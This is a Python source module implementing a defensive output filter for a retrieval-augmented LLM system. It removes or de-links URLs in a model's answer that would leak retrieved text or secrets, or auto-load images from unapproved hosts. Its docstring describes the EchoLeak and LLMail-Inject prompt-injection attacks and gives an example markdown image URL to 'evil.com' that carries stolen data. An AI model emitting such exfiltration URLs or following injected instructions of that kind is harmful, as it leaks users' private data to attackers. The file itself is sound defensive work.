"""Stage 3's egress guard: stop the answer itself from exfiltrating data.

This is the direct defense against EchoLeak (CVE-2025-32711) and the
markdown-rendering half of LLMail-Inject: a hidden instruction in a retrieved
chunk gets the model to emit ``![logo](https://evil.com/p?d=<stolen text>)``,
the user's markdown renderer auto-fetches the image with zero clicks, and the
data leaves before anyone reads anything.

``inspect_answer`` finds every place the answer could cause an outbound
request -- markdown image/link syntax (inline and reference-style),
autolinks, raw URLs, and HTML ``<img>``/``<a>`` -- and applies two
independent checks to each:

1. Taint (data flow, not keywords): decode the URL's path/query and see
   whether the decoded bytes contain material that was actually retrieved
   (or a known secret). A tainted URL is removed no matter how trustworthy
   its host looks -- a clean-looking host is exactly what an exfil URL
   pretends to have.
2. Rendering boundary: auto-loading content (images) to a host that isn't
   explicitly allow-listed is stripped even when nothing about it looks
   tainted, because "it will silently fetch on render" is itself the risk
   EchoLeak exploits, independent of payload content.

Plain (non-image) links are never blocked purely for an unknown host --
only for taint -- since a link the user has to click is not a zero-click
egress; it is de-linked (kept as visible text, URL dropped) rather than
removed outright, so it does not go on to be a plausible-looking tool
target for actions.py.
"""

from __future__ import annotations

import re
import time
from collections.abc import Mapping, Sequence
from dataclasses import dataclass
from urllib.parse import parse_qsl, unquote, urlparse

import nh3
from bs4 import BeautifulSoup
from markdown_it import MarkdownIt

from triad.contract import Chunk, GuardDecision

from ._shared import (
    LONG_SUBSTRING_MIN,
    chunk_shingle_index,
    decode_layers,
    host_allowed,
    hostname_of,
    longest_common_substring_len,
    matching_chunk_ids,
    normalize,
    shannon_entropy,
    shingles,
)

ENTROPY_MIN_LEN = 20
ENTROPY_THRESHOLD = 4.0

_REDACTED_LINK = "[link removed: untrusted data]"
_WITHHELD_ANSWER = "[answer withheld: could not verify the safety of its outbound links]"

_TRAILING_PUNCT = ".,;:!?'\")]}’”"

_REF_USE_RE = re.compile(r"(!)?\[([^\[\]]*)\]\[([^\[\]]*)\]")
_IMAGE_RE = re.compile(r'!\[([^\[\]]*)\]\(\s*(<[^<>]*>|[^)\s]+)(?:\s+(?:"[^"]*"|\'[^\']*\'))?\s*\)')
_LINK_RE = re.compile(r'(?<!!)\[([^\[\]]*)\]\(\s*(<[^<>]*>|[^)\s]+)(?:\s+(?:"[^"]*"|\'[^\']*\'))?\s*\)')
_AUTOLINK_RE = re.compile(r"<(https?://[^\s<>]+)>", re.IGNORECASE)
_HTML_IMG_RE = re.compile(r"<img\b[^>]*>", re.IGNORECASE)
_HTML_A_RE = re.compile(r"<a\b[^>]*>.*?</a>", re.IGNORECASE | re.DOTALL)
_RAW_URL_RE = re.compile(r'https?://[^\s<>()\[\]"\']+', re.IGNORECASE)


@dataclass(frozen=True)
class _Ref:
    """One outbound reference found in the answer, located by its exact
    character span in the source so a rewrite can touch only that span."""

    kind: str  # image | link | autolink | html_img | html_link | raw_url | ref_def
    url: str
    text: str | None
    is_image: bool
    span: tuple[int, int]
    match: str
    label: str | None = None
    inner_text: str | None = None


def _strip_url_angle_brackets(raw: str) -> str:
    return raw[1:-1] if raw.startswith("<") and raw.endswith(">") else raw


def _overlaps(span: tuple[int, int], spans: list[tuple[int, int]]) -> bool:
    s, e = span
    return any(a < e and s < b for a, b in spans)


def _line_offsets(text: str) -> list[int]:
    offsets = [0]
    for line in text.splitlines(keepends=True):
        offsets.append(offsets[-1] + len(line))
    return offsets


def _extract_html_ref(fragment: str, tag: str, attr: str) -> tuple[str | None, str | None]:
    """Sanitize an HTML fragment with nh3, then read it with BeautifulSoup.
    nh3 strips dangerous schemes/attrs (``javascript:``, ``onerror=``...)
    first so a malformed or booby-trapped fragment can't do anything to the
    parser; BeautifulSoup then gives us the attribute reliably regardless of
    quoting/casing."""
    cleaned = nh3.clean(fragment, tags={tag}, attributes={tag: {attr}}, url_schemes={"http", "https"})
    soup = BeautifulSoup(cleaned, "html.parser")
    node = soup.find(tag)
    if node is None:
        return None, None
    value = node.get(attr)
    text = node.get_text() if tag == "a" else None
    return value, text


def _extract_references(answer: str) -> tuple[list[_Ref], list[_Ref]]:
    """Every outbound reference in ``answer``, plus the reference-style
    definitions separately. Uses markdown-it-py to resolve reference-style
    ``[label]: url`` definitions correctly (including which source lines they
    occupy, via its line map) since re-deriving that by hand is exactly the
    kind of edge case a general markdown parser already gets right; the
    occurrence forms are located with targeted regexes so each one carries an
    exact character span to rewrite."""
    md = MarkdownIt("commonmark")
    env: dict = {}
    md.parse(answer, env)
    refs_env = env.get("references", {})
    line_offsets = _line_offsets(answer)

    ref_defs: list[_Ref] = []
    for label, info in refs_env.items():
        href = info.get("href")
        span_lines = info.get("map")
        if not href or not span_lines:
            continue
        start_line, end_line = span_lines
        start = line_offsets[start_line] if start_line < len(line_offsets) else len(answer)
        end = line_offsets[end_line] if end_line < len(line_offsets) else len(answer)
        ref_defs.append(
            _Ref(kind="ref_def", url=href, text=None, is_image=False, span=(start, end), match=answer[start:end], label=label.strip().lower())
        )

    occurrences: list[_Ref] = []
    consumed: list[tuple[int, int]] = [d.span for d in ref_defs]

    for m in _REF_USE_RE.finditer(answer):
        if _overlaps(m.span(), consumed):
            continue
        is_img = m.group(1) == "!"
        label = (m.group(3) or m.group(2)).strip().lower()
        href = refs_env.get(label, {}).get("href")
        if not href:
            continue
        occurrences.append(_Ref(kind="image" if is_img else "link", url=href, text=m.group(2), is_image=is_img, span=m.span(), match=m.group(0), label=label))
        consumed.append(m.span())

    for m in _IMAGE_RE.finditer(answer):
        if _overlaps(m.span(), consumed):
            continue
        url = _strip_url_angle_brackets(m.group(2))
        occurrences.append(_Ref(kind="image", url=url, text=m.group(1), is_image=True, span=m.span(), match=m.group(0)))
        consumed.append(m.span())

    for m in _LINK_RE.finditer(answer):
        if _overlaps(m.span(), consumed):
            continue
        url = _strip_url_angle_brackets(m.group(2))
        occurrences.append(_Ref(kind="link", url=url, text=m.group(1), is_image=False, span=m.span(), match=m.group(0)))
        consumed.append(m.span())

    for m in _AUTOLINK_RE.finditer(answer):
        if _overlaps(m.span(), consumed):
            continue
        occurrences.append(_Ref(kind="autolink", url=m.group(1), text=None, is_image=False, span=m.span(), match=m.group(0)))
        consumed.append(m.span())

    for m in _HTML_IMG_RE.finditer(answer):
        if _overlaps(m.span(), consumed):
            continue
        src, _ = _extract_html_ref(m.group(0), "img", "src")
        if not src:
            continue
        occurrences.append(_Ref(kind="html_img", url=src, text=None, is_image=True, span=m.span(), match=m.group(0)))
        consumed.append(m.span())

    for m in _HTML_A_RE.finditer(answer):
        if _overlaps(m.span(), consumed):
            continue
        href, inner_text = _extract_html_ref(m.group(0), "a", "href")
        if not href:
            continue
        occurrences.append(_Ref(kind="html_link", url=href, text=None, is_image=False, span=m.span(), match=m.group(0), inner_text=inner_text))
        consumed.append(m.span())

    for m in _RAW_URL_RE.finditer(answer):
        if _overlaps(m.span(), consumed):
            continue
        text, start, end = m.group(0), m.start(), m.end()
        while text and text[-1] in _TRAILING_PUNCT:
            text, end = text[:-1], end - 1
        if not text:
            continue
        occurrences.append(_Ref(kind="raw_url", url=text, text=None, is_image=False, span=(start, end), match=text))

    return occurrences, ref_defs


def _candidate_strings(url: str) -> list[tuple[str, str]]:
    """Every piece of the URL worth decoding and comparing: each path
    segment, the whole path, each query value, the whole query, and the
    fragment. Path/query are checked both as whole blobs and per-segment so
    a payload split across multiple params is still caught piecewise."""
    parsed = urlparse(url)
    out: list[tuple[str, str]] = []
    segments = [s for s in parsed.path.split("/") if s]
    for seg in segments:
        out.append((f"path_segment:{seg[:24]}", seg))
    if parsed.path:
        out.append(("path", parsed.path))
    for key, value in parse_qsl(parsed.query, keep_blank_values=True):
        out.append((f"query:{key}", value))
    if parsed.query:
        out.append(("query", parsed.query))
    if parsed.fragment:
        out.append(("fragment", parsed.fragment))
    return out


def _check_taint(
    url: str,
    context: Sequence[Chunk],
    chunk_index: dict[str, frozenset],
    secrets: Sequence[str],
) -> tuple[bool, list[dict]]:
    """Decode ``url``'s path/query/fragment through percent/base64/hex
    (nested one level deep) and test the decoded payloads against: known
    secrets (substring), retrieved-context word shingles, a long common
    substring with any retrieved chunk, and standalone high entropy. Any hit
    taints the whole URL -- fail closed, don't try to be clever about which
    hit "really" matters."""
    tainted = False
    evidence: list[dict] = []
    for label, raw_val in _candidate_strings(url):
        for decoding, decoded in decode_layers(raw_val):
            norm_decoded = normalize(decoded)
            for secret in secrets:
                if secret and normalize(secret) in norm_decoded:
                    tainted = True
                    evidence.append({"param": label, "decoding": decoding, "match_type": "secret", "chunk_id": None})
            d_shingles = shingles(decoded)
            if d_shingles:
                for cid in matching_chunk_ids(d_shingles, chunk_index):
                    tainted = True
                    evidence.append({"param": label, "decoding": decoding, "match_type": "shingle", "chunk_id": cid})
            if len(norm_decoded) >= LONG_SUBSTRING_MIN:
                for chunk in context:
                    lcs = longest_common_substring_len(norm_decoded, normalize(chunk.text))
                    if lcs >= LONG_SUBSTRING_MIN:
                        tainted = True
                        evidence.append({"param": label, "decoding": decoding, "match_type": "substring", "chunk_id": chunk.id, "length": lcs})
        if " " not in raw_val and len(raw_val) >= ENTROPY_MIN_LEN:
            entropy = shannon_entropy(raw_val)
            if entropy >= ENTROPY_THRESHOLD:
                tainted = True
                evidence.append({"param": label, "decoding": "raw", "match_type": "high_entropy", "chunk_id": None, "entropy": round(entropy, 2)})
    return tainted, evidence


def _delink_replacement(occ: _Ref) -> str:
    if occ.kind == "link" and occ.text and occ.text.strip() and normalize(occ.text) != normalize(occ.url):
        return occ.text
    if occ.kind == "html_link" and occ.inner_text and occ.inner_text.strip():
        return occ.inner_text
    return _REDACTED_LINK


def _apply_edits(answer: str, edits: list[tuple[int, int, str]]) -> str:
    out: list[str] = []
    pos = 0
    for start, end, repl in sorted(edits, key=lambda e: e[0]):
        if start < pos:
            continue  # overlapping edit; keep the first (defensive, shouldn't occur)
        out.append(answer[pos:start])
        out.append(repl)
        pos = max(pos, end)
    out.append(answer[pos:])
    return "".join(out)


def inspect_answer(
    answer: str,
    context: Sequence[Chunk],
    *,
    allow_hosts: frozenset[str] = frozenset(),
    secrets: Sequence[str] = (),
) -> GuardDecision:
    """Check a generated answer for outbound references that would leak
    retrieved data or secrets, or that would silently render from a host
    nobody approved. Returns ``.ok`` untouched, or ``.block`` with the
    dangerous parts removed/de-linked in ``.rewritten`` and the evidence for
    why in ``.evidence``.

    Any internal failure fails closed: the whole answer is withheld rather
    than shipped unchecked.
    """
    start_time = time.perf_counter()
    try:
        occurrences, ref_defs = _extract_references(answer)
        chunk_index = chunk_shingle_index(context)

        taint_cache: dict[str, tuple[bool, list[dict]]] = {}

        def tainted_of(url: str) -> tuple[bool, list[dict]]:
            if url not in taint_cache:
                taint_cache[url] = _check_taint(url, context, chunk_index, secrets)
            return taint_cache[url]

        image_urls = {occ.url for occ in occurrences if occ.is_image} | {d.url for d in ref_defs}
        host_blocked = {u: not host_allowed(hostname_of(u), allow_hosts) for u in image_urls}

        edits: list[tuple[int, int, str]] = []
        removed: list[dict] = []
        delinked: list[dict] = []

        for occ in occurrences:
            tainted, matches = tainted_of(occ.url)
            if occ.is_image:
                blocked = host_blocked.get(occ.url, False)
                if tainted or blocked:
                    reason = "tainted_image" if tainted else "untrusted_host_image"
                    edits.append((*occ.span, ""))
                    removed.append({"kind": occ.kind, "url": occ.url, "host": hostname_of(occ.url), "reason": reason, "matches": matches})
            elif tainted:
                edits.append((*occ.span, _delink_replacement(occ)))
                delinked.append({"kind": occ.kind, "url": occ.url, "reason": "tainted_link", "matches": matches})

        for d in ref_defs:
            tainted, matches = tainted_of(d.url)
            blocked = host_blocked.get(d.url, False)
            if tainted or blocked:
                reason = "tainted_reference_definition" if tainted else "untrusted_host_reference_definition"
                edits.append((*d.span, ""))
                removed.append({"kind": "ref_def", "url": d.url, "label": d.label, "host": hostname_of(d.url), "reason": reason, "matches": matches})

        latency_ms = (time.perf_counter() - start_time) * 1000
        if not edits:
            return GuardDecision.ok("egress", latency_ms=latency_ms)

        rewritten = _apply_edits(answer, edits)
        reasons = tuple(sorted({f"removed:{e['reason']}" for e in removed} | {f"delinked:{e['reason']}" for e in delinked}))
        evidence = {"removed": removed, "delinked": delinked}
        return GuardDecision.block("egress", *reasons, evidence=evidence, rewritten=rewritten, latency_ms=latency_ms)
    except Exception as exc:  # fail closed: never ship an unverified answer
        latency_ms = (time.perf_counter() - start_time) * 1000
        return GuardDecision.block(
            "egress",
            f"internal error during egress inspection: {exc!r}",
            evidence={"error": repr(exc)},
            rewritten=_WITHHELD_ANSWER,
            latency_ms=latency_ms,
        )
